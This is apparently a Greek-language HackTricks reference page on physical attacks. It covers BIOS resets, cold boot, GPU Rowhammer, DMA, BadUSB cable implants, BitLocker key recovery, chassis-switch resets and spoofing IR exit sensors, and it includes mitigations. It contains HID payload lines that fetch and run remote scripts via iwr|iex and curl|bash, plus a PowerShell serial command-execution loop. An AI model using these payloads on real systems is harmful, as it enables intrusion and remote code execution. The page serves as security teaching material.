# Φυσικές Επιθέσεις

{{#include ../banners/hacktricks-training.md}}

## Ανάκτηση κωδικού BIOS και ασφάλεια συστήματος

Οι ρυθμίσεις firmware παλαιών PC μπορεί να επαναφερθούν αποσυνδέοντας την μπαταρία CMOS ή χρησιμοποιώντας έναν τεκμηριωμένο βραχυκυκλωτήρα clear-CMOS. Ο απαραίτητος χρόνος απενεργοποίησης εξαρτάται από τη μητρική πλακέτα, ενώ οι σύγχρονοι κωδικοί ή τα κλειδιά UEFI μπορεί να βρίσκονται σε μη πτητική flash μνήμη, σε ενσωματωμένο controller ή σε συσκευή ασφαλείας και, επομένως, να παραμένουν μετά την αφαίρεση της μπαταρίας. Συμβουλευτείτε το εγχειρίδιο της μητρικής πλακέτας ή το εγχειρίδιο service πριν βραχυκυκλώσετε ακίδες· αυτή η διαδικασία μπορεί επίσης να ακυρώσει τις μετρήσεις TPM και να ενεργοποιήσει την ανάκτηση κρυπτογράφησης δίσκου.

Σε παλαιά συστήματα x86, εργαλεία όπως τα **killCMOS** και **CmosPwd** μπορούν να επιθεωρήσουν ή να τροποποιήσουν ρυθμίσεις που υποστηρίζονται από CMOS από ένα bootable περιβάλλον. Το CmosPwd αναγνωρίζει μορφές κωδικών από ένα τεκμηριωμένο σύνολο παλαιότερων οικογενειών BIOS και μπορεί να δημιουργήσει αντίγραφο ασφαλείας, να επαναφέρει ή να διαγράψει/τερματίσει την κατάσταση CMOS· οι δημοσιευμένες εκδόσεις του στοχεύουν σε περιβάλλοντα παλαιού τύπου DOS/Windows, Linux, FreeBSD και NetBSD.<sup>[[18]](#references)</sup> Αυτά τα βοηθητικά προγράμματα δεν είναι γενικοί αφαιρέτες κωδικών UEFI και απαιτούν επαρκή πρόσβαση στο hardware/firmware.

Ορισμένα firmware laptop εμφανίζουν έναν ειδικό για τον κατασκευαστή κωδικό πρόκλησης μετά από αρκετές αποτυχημένες προσπάθειες εισαγωγής κωδικού. Βάσεις δεδομένων όπως το [bios-pw.org](https://bios-pw.org) μπορούν να υπολογίσουν κωδικούς ανάκτησης παλαιού τύπου για ορισμένα μοντέλα, όμως πολλά συστήματα εφαρμόζουν κλείδωμα χωρίς κωδικό πρόκλησης που μπορεί να υπολογιστεί. Αντιμετωπίστε οποιονδήποτε παραγόμενο κωδικό ως ειδικό για το εκάστοτε μοντέλο και αποφύγετε την εξάντληση μετρητών προσπαθειών που δεν μπορούν να επαναφερθούν.

### Ασφάλεια UEFI

Για σύγχρονα συστήματα **UEFI**, το CHIPSEC μπορεί να ελέγξει τις προστασίες των μεταβλητών Secure Boot. Ξεκινήστε με τον έλεγχο που δεν τροποποιεί το σύστημα παρακάτω· η προαιρετική λειτουργία `-a modify` επιχειρεί σκόπιμα να καταστρέψει μεταβλητές και θα πρέπει να χρησιμοποιείται μόνο σε ανακτήσιμο εργαστηριακό σύστημα. Το ίδιο το CHIPSEC προειδοποιεί ότι ο προνομιούχος driver και η πρόσβαση σε hardware χαμηλού επιπέδου δεν είναι κατάλληλα για endpoints παραγωγής.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Ανάλυση RAM και Cold Boot Attacks

Η DRAM δεν χάνει κάθε bit αμέσως όταν σταματήσει το refresh. Ο ρυθμός αποσύνθεσης διαφέρει σημαντικά ανάλογα με την τεχνολογία του module και τη θερμοκρασία· η ψύξη μπορεί να διατηρήσει χρήσιμα δεδομένα για πολύ περισσότερο από έναν κύκλο απενεργοποίησης και επανεκκίνησης χωρίς ψύξη. Ένα cold-boot attack εκτελεί γρήγορη επανεκκίνηση σε ένα μικρό περιβάλλον acquisition ή μεταφέρει ένα ψυχόμενο module, καταγράφει την ακατέργαστη μνήμη και ανακατασκευάζει cryptographic keys παρά την αποσύνθεση των bit. Ένα disk-copy utility δεν είναι αυτόματα εργαλείο απεικόνισης φυσικής μνήμης και το Volatility αναλύει ένα capture αντί να το αποκτά· χρησιμοποιήστε ένα κατάλληλο για την πλατφόρμα και επικυρωμένο εργαλείο acquisition.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer Against Page Tables

Τα σύγχρονα GPU Rowhammer attacks γίνονται πολύ πιο χρήσιμα όταν στοχεύουν **GPU virtual-memory metadata** αντί για συνηθισμένα buffers. Πρόσφατη έρευνα σε **GDDR6 NVIDIA Ampere GPUs** δείχνει ότι ένας attacker που εκτελεί unprivileged CUDA code μπορεί να δημιουργήσει GPU-specific hammering patterns, να χρησιμοποιήσει **memory massaging** για να τοποθετήσει paging structures σε ευάλωτες γραμμές και, στη συνέχεια, να προκαλέσει bit flips στο **last-level page table** ή σε έναν ενδιάμεσο **page directory**. Μόλις καταστραφεί μία translation entry, ο attacker μπορεί να δημιουργήσει **arbitrary GPU memory read/write** και, στη συνέχεια, να κάνει pivot για compromise του host.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** σε GDDR6 και δημιουργήστε refresh-aware / non-uniform hammering patterns που παρακάμπτουν τις mitigations εντός DRAM.
2. **Κάντε massage στις GPU allocations**, ώστε ο driver να τοποθετεί τα page-translation structures σε hammerable physical locations αντί να τα διατηρεί στο προεπιλεγμένο protected pool. Στην πράξη, αυτό μπορεί να σημαίνει εξάντληση της low-memory page-table region και spraying μεγάλων sparse UVM mappings με ελεγχόμενα strides.
3. **Κάντε flip translation metadata**, όπως **PFN** ή aperture-related bits, μέσα σε ένα page-table / page-directory entry, ώστε η virtual page που ελέγχει ο attacker να επιλύεται σε page-table pages, arbitrary GPU memory ή host-visible system mappings.
4. Επαναχρησιμοποιήστε το forged mapping για να ξαναγράψετε επιπλέον translation entries και να κλιμακώσετε σε **arbitrary GPU memory read/write** μεταξύ GPU contexts.

### Host Pivot and Mitigations

- Με **IOMMU disabled**, τα forged system-aperture mappings μπορούν να εκθέσουν αυθαίρετη **host physical memory** στη GPU, μετατρέποντας το GPU primitive σε πλήρες host compromise.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Το **GDDRHammer** στοχεύει last-level page-table entries, ενώ το **GeForge** δείχνει ότι η καταστροφή ενός page-directory level μπορεί να είναι ευκολότερη, επειδή ένα bit flip μπορεί να ανακατευθύνει ένα μεγαλύτερο translation subtree. Μην θεωρείτε ότι μόνο ένα paging layer είναι κρίσιμο για την ασφάλεια.<sup>[[1]](#references)[[2]](#references)</sup>
- Το **IOMMU** εξακολουθεί να είναι σημαντικό, επειδή αποκλείει τη διαδρομή άμεσης πρόσβασης σε arbitrary-host-memory που χρησιμοποιούν τα GDDRHammer/GeForge, αλλά **δεν αποτελεί πλήρη mitigation**. Το **GPUBreach** δείχνει ένα second-stage pivot όπου ο attacker καταστρέφει GPU-writable, driver-owned CPU buffers και, στη συνέχεια, ενεργοποιεί memory-safety bugs στον NVIDIA driver για να αποκτήσει kernel write primitive και ένα **root shell**, ακόμη και με ενεργοποιημένο IOMMU.<sup>[[3]](#references)</sup>
- Το **system-level ECC** αποτελεί πρακτικό hardening step σε υποστηριζόμενες workstation/server GPUs. Οι consumer GPUs χωρίς ECC εκθέτουν μια πιο αδύναμη επιφάνεια άμυνας.<sup>[[4]](#references)</sup>
- Αυτά τα attacks δεν είναι αποκλειστικά θεωρητικά: το **GeForge** ανέφερε **1,171** bit flips σε RTX 3060 και **202** σε RTX A6000, αριθμός αρκετός για τη δημιουργία μιας λειτουργικής αλυσίδας host-privilege-escalation.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

Για offline UEFI IFR/NVRAM patching που μπορεί να υποβαθμίσει την επιβολή IOMMU πριν από το boot και να ενεργοποιήσει μια Windows DMA chain, δείτε:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

Το **Inception** επιδεικνύει **DMA-based memory acquisition and patching** μέσω interfaces όπως το FireWire και οι πρώιμες διαμορφώσεις Thunderbolt, συμπεριλαμβανομένων historical login-bypass signatures. Δεν είναι απλώς «ineffective against Windows 10»: η exploitability εξαρτάται από το interface, το target build, την IOMMU policy, την κατάσταση lock και το αν υποστηρίζεται και είναι ενεργοποιημένο το Windows Kernel DMA Protection. Τα Windows 10 version 1803 και μεταγενέστερα εισήγαγαν το Kernel DMA Protection σε συμβατές πλατφόρμες, αλλάζοντας σημαντικά την attack surface.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB για Πρόσβαση στο Σύστημα

Σε έναν μη κρυπτογραφημένο ή ήδη ξεκλειδωμένο Windows volume, ένα offline environment μπορεί να αντικαταστήσει accessibility binaries όπως τα **sethc.exe** ή **Utilman.exe** με το **cmd.exe**, παρέχοντας ένα SYSTEM command prompt όταν εκτελεστεί η αντίστοιχη συντόμευση της logon screen. Εργαλεία όπως το **chntpw** μπορούν να επεξεργαστούν local SAM account data. Αυτές οι μέθοδοι δεν παρακάμπτουν ένα κλειδωμένο BitLocker volume και μπορούν να καταστρέψουν credentials που προστατεύονται από DPAPI/EFS· διατηρήστε forensic copies και backups.

Το **Kon-Boot** είναι ένα commercial boot-time authentication-bypass tool για υποστηριζόμενες διαμορφώσεις Windows/macOS. Η συμβατότητα εξαρτάται από το OS, το firmware mode, το Secure Boot και τη ρύθμιση disk-encryption· δεν αποκρυπτογραφεί ένα BitLocker-locked volume.<sup>[[10]](#references)</sup>

---

## Διαχείριση Windows Security Features

### Boot και Recovery Shortcuts

- Το **Delete/Supr**, το F2, το F10 ή κάποιο άλλο vendor key μπορεί να ανοίξει το firmware setup.
- Το **F8** εισέρχεται σε legacy Windows advanced boot options μόνο σε διαμορφώσεις όπου αυτή η διαδρομή παραμένει ενεργοποιημένη· η είσοδος στο current recovery διαφέρει.
- Το πάτημα του **Shift** μπορεί να καταστείλει το Windows automatic logon σε ορισμένες διαμορφώσεις, αν και οι policy/registry settings μπορούν να απενεργοποιήσουν αυτή τη συμπεριφορά.<sup>[[17]](#references)</sup>

### BAD USB Devices

Συσκευές όπως το **USB Rubber Ducky** και τα Teensy boards μπορούν να κάνουν enumerate ως trusted HID keyboards και να inject προκαθορισμένα keystrokes. Το payload αρχικά έχει τα privileges και την desktop access του logged-on session· τα UAC prompts, το screen locking, το keyboard layout, το timing και η endpoint USB policy εξακολουθούν να το περιορίζουν.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator ή backup privileges μπορούν να δημιουργήσουν ένα shadow copy ή να αποθηκεύσουν registry hives, ώστε locked files όπως τα **SAM** και **SYSTEM** να μπορούν να αποκτηθούν. Πρόκειται για post-compromise collection technique και όχι για privilege bypass, και θα πρέπει να συσχετίζεται με events εξαγωγής `diskshadow`/VSS και registry-hive.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Implants βασισμένα σε ESP32-S3, όπως το **Evil Crow Cable Wind**, κρύβονται μέσα σε καλώδια USB-A→USB-C ή USB-C↔USB-C, κάνουν enumerate αποκλειστικά ως USB keyboard και εκθέτουν το C2 stack τους μέσω Wi-Fi. Ο operator χρειάζεται μόνο να τροφοδοτήσει το καλώδιο από το victim host, να δημιουργήσει ένα hotspot με όνομα `Evil Crow Cable Wind` και κωδικό `123456789` και να μεταβεί στη διεύθυνση [http://cable-wind.local/](http://cable-wind.local/) (ή στη DHCP address του) για να αποκτήσει πρόσβαση στο embedded HTTP interface.<sup>[[8]](#references)</sup>
- Το browser UI παρέχει tabs για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* και *Config*. Τα stored payloads φέρουν tag ανά OS, τα keyboard layouts αλλάζουν on the fly και τα VID/PID strings μπορούν να τροποποιηθούν ώστε να μιμούνται γνωστά peripherals.
- Επειδή το C2 βρίσκεται μέσα στο καλώδιο, ένα τηλέφωνο μπορεί να κάνει stage payloads, να ενεργοποιεί την εκτέλεσή τους και να διαχειρίζεται Wi-Fi credentials χωρίς χρήση του network του οργανισμού — χρήσιμο για physical intrusions μικρού dwell-time.

### OS-aware AutoExec payloads

- Οι κανόνες AutoExec συνδέουν ένα ή περισσότερα payloads, ώστε να εκτελούνται αμέσως μετά το USB enumeration. Το implant πραγματοποιεί lightweight OS fingerprinting και επιλέγει το αντίστοιχο script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ή `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Επειδή η εκτέλεση είναι unattended, η απλή αντικατάσταση ενός charging cable μπορεί να επιτύχει initial access τύπου «plug-and-pwn» στο logged-on user context.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Ένα stored payload ανοίγει μια console και κάνει paste έναν loop που εκτελεί οτιδήποτε φτάνει στη νέα USB serial device. Μια minimal Windows variant είναι:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Το implant διατηρεί ανοιχτό το κανάλι USB CDC, ενώ το ESP32-S3 εκκινεί έναν TCP client (Python script, Android APK ή desktop executable) προς τον operator. Οποιαδήποτε bytes πληκτρολογούνται στη συνεδρία TCP προωθούνται στον παραπάνω serial loop, παρέχοντας remote command execution ακόμη και σε air-gapped hosts. Η έξοδος είναι περιορισμένη, επομένως οι operators εκτελούν συνήθως blind commands (δημιουργία λογαριασμών, staging πρόσθετων εργαλείων κ.λπ.).

### Επιφάνεια ενημέρωσης HTTP OTA

- Το documented Evil Crow Cable Wind interface εκθέτει ένα unauthenticated firmware-update endpoint στο `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Οι field operators μπορούν να κάνουν hot-swap δυνατοτήτων (π.χ. flash του firmware του USB Army Knife) κατά τη διάρκεια του engagement χωρίς να ανοίξουν το καλώδιο, επιτρέποντας στο implant να μεταβαίνει σε νέες δυνατότητες ενώ παραμένει συνδεδεμένο στο target host.

## Παράκαμψη της κρυπτογράφησης BitLocker

Μια εξουσιοδοτημένη forensic απόκτηση από ένα live ή πρόσφατα εκτελούμενο σύστημα μπορεί να περιέχει το BitLocker volume master key ή σχετικό key material όσο το volume είναι ξεκλείδωτο. Commercial tools όπως τα Elcomsoft Forensic Disk Decryptor και Passware Kit Forensic μπορούν να αναζητήσουν σε υποστηριζόμενα memory images, hibernation files ή crash dumps, όμως η επιτυχία δεν είναι εγγυημένη. Τα σύγχρονα Windows κρυπτογραφούν επίσης τα crash dumps όταν είναι ενεργοποιημένο το BitLocker, ενώ ένα αποθηκευμένο 48-digit recovery password είναι διαφορετικό artifact από ένα in-memory volume key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering για την προσθήκη Recovery Key

Ένας attacker που πείθει έναν administrator να εκτελέσει BitLocker-management commands μπορεί να προσθέσει ένα recovery-password, external-key ή άλλο protector και στη συνέχεια να το καταγράψει. Ένα recovery password δεν μπορεί να είναι μια αυθαίρετη συμβολοσειρά από μηδενικά: τα BitLocker numerical recovery passwords έχουν επικυρωμένη μορφή 48 ψηφίων. Η σχετική σύνταξη εξουσιοδοτημένης διαχείρισης είναι `manage-bde -protectors -add C: -recoverypassword`; για να εμφανίσετε τα protectors που προέκυψαν, χρησιμοποιήστε `manage-bde -protectors -get C:`. Παρακολουθείτε τις προσθήκες protectors και διασφαλίζετε ότι το νέο recovery material γίνεται escrow μόνο σε εγκεκριμένες τοποθεσίες.<sup>[[16]](#references)</sup>

---

## Εκμετάλλευση Chassis Intrusion / Maintenance Switches για Factory-Reset του BIOS

Πολλά σύγχρονα laptops και desktops μικρού form factor περιλαμβάνουν έναν **chassis-intrusion switch**, τον οποίο παρακολουθούν ο Embedded Controller (EC) και το BIOS/UEFI firmware.  Ενώ ο κύριος σκοπός του switch είναι να δημιουργεί alert όταν ανοίγει μια συσκευή, οι vendors μερικές φορές υλοποιούν ένα **undocumented recovery shortcut**, το οποίο ενεργοποιείται όταν ο switch αλλάξει κατάσταση σύμφωνα με ένα συγκεκριμένο pattern.<sup>[[5]](#references)[[6]](#references)</sup>

### Πώς λειτουργεί το Attack

1. Ο switch είναι συνδεδεμένος σε ένα **GPIO interrupt** του EC.
2. Το firmware που εκτελείται στον EC καταγράφει το **timing και τον αριθμό των πατημάτων**.
3. Όταν αναγνωριστεί ένα hard-coded pattern, ο EC καλεί μια *mainboard-reset* routine που **διαγράφει τα περιεχόμενα του system NVRAM/CMOS**.
4. Στην επόμενη εκκίνηση, τα επηρεαζόμενα μοντέλα φορτώνουν reset firmware state. Ανάλογα με τον vendor και το revision, η κατάσταση που διαγράφηκε μπορεί να περιλαμβάνει supervisor password, custom boot settings ή enrolled Secure Boot keys· η κατάσταση του TPM και οι επιπτώσεις στην disk encryption πρέπει να αξιολογούνται ξεχωριστά.

> Ένα firmware reset μπορεί να επαναφέρει τις επιλογές external-boot, όμως **δεν** αποκρυπτογραφεί το storage. Το BitLocker ή άλλο full-disk encryption system μπορεί να εισέλθει σε recovery μετά από αλλαγές στο TPM/firmware και να εξακολουθεί να προστατεύει τον εσωτερικό drive χωρίς recovery key.<sup>[[16]](#references)</sup>

### Παράδειγμα από τον πραγματικό κόσμο – Framework 13 Laptop

Το recovery shortcut για το Framework 13 (11th/12th/13th-gen) είναι:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Μετά τον δέκατο κύκλο, το EC θέτει μια σημαία που instructs το BIOS να διαγράψει το NVRAM στην επόμενη επανεκκίνηση. Η whole procedure διαρκεί περίπου 40 s και απαιτεί **τίποτα περισσότερο από ένα κατσαβίδι**.<sup>[[5]](#references)</sup>

### Γενική Διαδικασία Exploitation

1. Ενεργοποιήστε ή εκτελέστε suspend-resume στο target ώστε να εκτελείται το EC.
2. Αφαιρέστε το κάτω κάλυμμα για να αποκαλύψετε τον intrusion/maintenance switch.
3. Αναπαραγάγετε το toggle pattern που είναι ειδικό για τον vendor (συμβουλευτείτε documentation, forums ή κάντε reverse-engineer το firmware του EC).
4. Επανασυναρμολογήστε και κάντε reboot και, στη συνέχεια, ελέγξτε ποιες ρυθμίσεις firmware και credentials άλλαξαν πραγματικά.
5. Εάν υπάρχει authorization και είναι διαθέσιμο external boot, εκκινήστε ένα controlled live image. Μόλις ένα internal volume ξεκλειδωθεί νόμιμα (ή αν δεν ήταν ποτέ encrypted), το live environment μπορεί να αποκτήσει credentials και data ή να επιθεωρήσει το EFI System Partition. Η τροποποίηση αυτού του partition για την εγκατάσταση ενός EFI implant είναι persistent και ιδιαίτερα intrusive και εξακολουθεί να περιορίζεται από το Secure Boot, το measured boot, την προστασία εγγραφής του firmware και το endpoint monitoring. Το encrypted storage παραμένει μη προσβάσιμο χωρίς το key ή recovery material.

### Ανίχνευση & Μετριασμός

* Καταγράφετε τα chassis-intrusion events στην OS management console και συσχετίζετέ τα με απρόσμενα BIOS resets.
* Χρησιμοποιείτε **tamper-evident seals** σε βίδες/καλύμματα για την ανίχνευση ανοίγματος.
* Διατηρείτε τις συσκευές σε **physically controlled areas**· θεωρείτε ότι το physical access ισοδυναμεί με πλήρες compromise.
* Όπου είναι διαθέσιμο, απενεργοποιήστε τη λειτουργία “maintenance switch reset” του vendor ή απαιτήστε πρόσθετη cryptographic authorisation για NVRAM resets.

---

## Covert IR Injection Εναντίον No-Touch Exit Sensors

### Χαρακτηριστικά Sensor
- Τα commodity “wave-to-exit” sensors συνδυάζουν έναν near-IR LED emitter με ένα receiver module τύπου TV remote, το οποίο αναφέρει logic high μόνο αφού ανιχνεύσει πολλαπλούς παλμούς (~4–10) του σωστού carrier (≈30 kHz).<sup>[[7]](#references)</sup>
- Ένα πλαστικό shroud εμποδίζει τον emitter και τον receiver να κοιτάζουν απευθείας ο ένας τον άλλο, οπότε ο controller θεωρεί ότι οποιοσδήποτε validated carrier προήλθε από κοντινή ανάκλαση και ενεργοποιεί ένα relay που ανοίγει το door strike.
- Μόλις ο controller θεωρήσει ότι υπάρχει target, συχνά αλλάζει το outbound modulation envelope, όμως ο receiver συνεχίζει να δέχεται οποιοδήποτε burst ταιριάζει με το filtered carrier.

### Attack Workflow
1. **Capture του emission profile** – συνδέστε έναν logic analyser στα pins του controller για να καταγράψετε τόσο τις pre-detection όσο και τις post-detection waveforms που οδηγούν το internal IR LED.
2. **Replay μόνο της “post-detection” waveform** – αφαιρέστε ή αγνοήστε τον stock emitter και οδηγήστε ένα external IR LED με το ήδη triggered pattern εξαρχής. Επειδή ο receiver ενδιαφέρεται μόνο για το pulse count/frequency, αντιμετωπίζει το spoofed carrier ως genuine reflection και θέτει τη relay line σε ενεργή κατάσταση.
3. **Gate της transmission** – μεταδώστε το carrier σε tuned bursts (π.χ. δεκάδες milliseconds ενεργό, παρόμοιο διάστημα ανενεργό) ώστε να παρέχετε το minimum pulse count χωρίς να κορεστεί το AGC του receiver ή το interference handling logic. Η continuous emission απευαισθητοποιεί γρήγορα το sensor και σταματά την ενεργοποίηση του relay.

### Long-Range Reflective Injection
- Η αντικατάσταση του bench LED με high-power IR diode, MOSFET driver και focusing optics επιτρέπει αξιόπιστο triggering από απόσταση περίπου 6 m.
- Ο attacker δεν χρειάζεται line-of-sight προς το receiver aperture· η στόχευση της δέσμης σε interior walls, shelving ή door frames που είναι ορατά μέσω γυαλιού επιτρέπει στην reflected energy να εισέλθει στο ~30° field of view και να μιμηθεί ένα hand wave από κοντινή απόσταση.
- Επειδή οι receivers περιμένουν μόνο weak reflections, μια πολύ ισχυρότερη external beam μπορεί να ανακλαστεί σε πολλαπλές επιφάνειες και να παραμείνει πάνω από το detection threshold.

### Weaponised Attack Torch
- Η ενσωμάτωση του driver μέσα σε έναν commercial flashlight αποκρύπτει το tool σε κοινή θέα. Αντικαταστήστε το visible LED με ένα high-power IR LED προσαρμοσμένο στο band του receiver, προσθέστε ένα ATtiny412 (ή παρόμοιο) για τη δημιουργία των ≈30 kHz bursts και χρησιμοποιήστε ένα MOSFET για να sink το LED current.
- Ένας telescopic zoom lens περιορίζει τη δέσμη για range/precision, ενώ ένα vibration motor υπό MCU control παρέχει haptic confirmation ότι το modulation είναι ενεργό, χωρίς εκπομπή visible light.
- Η εναλλαγή μεταξύ αρκετών stored modulation patterns (με ελαφρώς διαφορετικές carrier frequencies και envelopes) αυξάνει τη συμβατότητα μεταξύ rebranded sensor families, επιτρέποντας στον operator να σαρώνει reflective surfaces μέχρι να ακουστεί το relay να κάνει click και να απελευθερωθεί η πόρτα.

---

## References

- [1] [GDDRHammer: Ιδιαίτερα disruptive DRAM Rows — Cross-Component Rowhammer Attacks από σύγχρονες GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory για τη δημιουργία GPU Page Tables για διασκέδαση και κέρδος](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks σε GPUs με χρήση Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - Ιούλιος 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Πατήστε εδώ για pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Οδηγός Mainboard Reset](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Παράκαμψη IR No-Touch Exit Sensors με ένα Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking με Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack εναντίον NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Επίσημη documentation και πληροφορίες συμβατότητας του Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Προστασίες Secure Boot variables](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks σε Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation μέσω DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Τεκμηρίωση του Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Οδηγός λειτουργιών BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Συμπεριφορά κατά το πάτημα του Shift και automatic logon](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentation και downloads του CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
